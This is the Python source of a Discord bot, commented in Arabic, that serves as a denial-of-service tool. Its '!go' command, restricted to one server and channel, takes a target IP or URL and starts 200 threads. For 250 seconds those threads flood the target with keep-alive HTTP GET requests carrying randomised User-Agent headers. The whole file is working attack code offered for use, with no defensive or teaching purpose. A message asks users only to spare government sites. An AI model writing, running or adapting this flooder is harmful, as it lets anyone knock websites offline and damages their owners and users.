import discord
from discord.ext import commands
from discord.ui import Button, View
import socket
import time
import random
from threading import Thread
import re
import urllib.parse

# تعريف البوت
intents = discord.Intents.default()
intents.message_content = True  # تمكين الوصول لمحتوى الرسائل
bot = commands.Bot(command_prefix="!", intents=intents)

# قائمة User-Agent
def UAlist():
    return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
        "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.44"
    ]

# دالة استخراج اسم المضيف والمسار من الرابط
def extract_url_info(url):
    try:
        # إضافة بروتوكول إذا كان الرابط لا يحتوي عليه
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.netloc
        path = parsed_url.path
        # إذا كان المسار فارغا، استخدم '/'
        if not path:
            path = '/'
        return host, path
    except:
        return None, None

# دالة HTTP الخاصة بهجوم الفيضانات المحسنة
def http(target, floodtime):
    # التعرف إذا كان الهدف رابط أو IP
    if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target):
        # الهدف هو IP
        host = target
        path = '/'
        port = 80
    else:
        # الهدف هو رابط
        host, path = extract_url_info(target)
        port = 80  # افتراضي

    while time.time() < floodtime and host:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect((host, port))
                while time.time() < floodtime:
                    request = f'GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAlist())}\r\nConnection: keep-alive\r\n\r\n'
                    sock.send(request.encode())
            except:
                sock.close()

# تعريف المتغيرات العامة
ALLOWED_SERVER_ID = 923906395764555817
ALLOWED_CHANNEL_ID = 1371579013373366392

# حدث عند تشغيل البوت
@bot.event
async def on_ready():
    print(f'Bot is ready: {bot.user.name}')

    # التحقق من السيرفرات والخروج من أي سيرفر غير محدد
    for guild in bot.guilds:
        if guild.id != ALLOWED_SERVER_ID:
            try:
                await guild.leave()
                print(f'Left guild: {guild.name} ({guild.id})')
            except Exception as e:
                print(f'Error leaving guild {guild.id}: {e}')

# حدث عند دخول سيرفر جديد
@bot.event
async def on_guild_join(guild):
    if guild.id != ALLOWED_SERVER_ID:
        try:
            await guild.leave()
            print(f'Left new guild: {guild.name} ({guild.id})')
        except Exception as e:
            print(f'Error leaving guild {guild.id}: {e}')

# حدث لفحص الرسائل
@bot.event
async def on_message(message):
    # تجاهل رسائل البوت نفسه
    if message.author.bot:
        return

    # التحقق من السيرفر
    if message.guild and message.guild.id != ALLOWED_SERVER_ID:
        return
    # التحقق من القناة
    if message.channel.id != ALLOWED_CHANNEL_ID:
        return  # تجاهل الرسائل من قنوات أخرى
    # معالجة الأوامر في القناة المسموحة
    await bot.process_commands(message)

# أمر !go لتنفيذ الهجوم
@bot.command()
async def go(ctx, ip: str, port: int = 80):
    # التحقق الإضافي من القناة (للتأكيد)
    if ctx.channel.id != ALLOWED_CHANNEL_ID or (ctx.guild and ctx.guild.id != ALLOWED_SERVER_ID):
        print(f"أمر مرفوض: قناة {ctx.channel.id}, سيرفر {ctx.guild.id if ctx.guild else 'DM'}")
        return

    embed = discord.Embed(color=discord.Color.red(), description="يرجئ عدم مهاجمة المواقع الحكومية")
    embed.set_image(url="https://cdn.discordapp.com/attachments/1371211425640616119/1371489597183361176/Picsart_25-05-12_17-09-32-260.jpg?ex=682352b9&is=68220139&hm=55eced9580e288d37dd85e1e37b26072e63517178436aae4d42ba99162e33118&")
    # إنشاء زر للخيارات
    button = Button(label="اختيار HTTP", style=discord.ButtonStyle.green)

    # عندما يضغط المستخدم على الزر
    async def on_button_click(interaction):
        # التحقق الإضافي من القناة (للتأكيد)
        if interaction.channel.id != ALLOWED_CHANNEL_ID or (interaction.guild and interaction.guild.id != ALLOWED_SERVER_ID):
            await interaction.response.send_message("غير مسموح باستخدام هذا الأمر هنا", ephemeral=True)
            return

        target = ip
        # التحقق من صحة المدخل (سواء كان IP أو رابط)
        ip_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        if re.match(ip_pattern, ip):
            # المدخل هو IP صالح
            target = ip
        else:
            # محاولة معالجة الرابط
            host, path = extract_url_info(ip)
            if not host:
                await interaction.response.send_message("الرابط/الايبي غير صالح")
                return
            target = ip  # استخدام الرابط الكامل

        threads = 200  # الحد الآمن لـ Replit (بدلاً من 1000)
        duration = 250  # المدة بالثواني
        for _ in range(threads):
            Thread(target=http, args=(target, time.time() + duration)).start()
        await interaction.response.send_message(f"تم البدء بنجاح ")

    button.callback = on_button_click
    # إرسال الرسالة مع المنيو
    view = View()
    view.add_item(button)
    await ctx.send(embed=embed, view=view)

# تشغيل البوت بعد طلب التوكن
if __name__ == '__main__':
    token = input("token : ")
    bot.run(token)
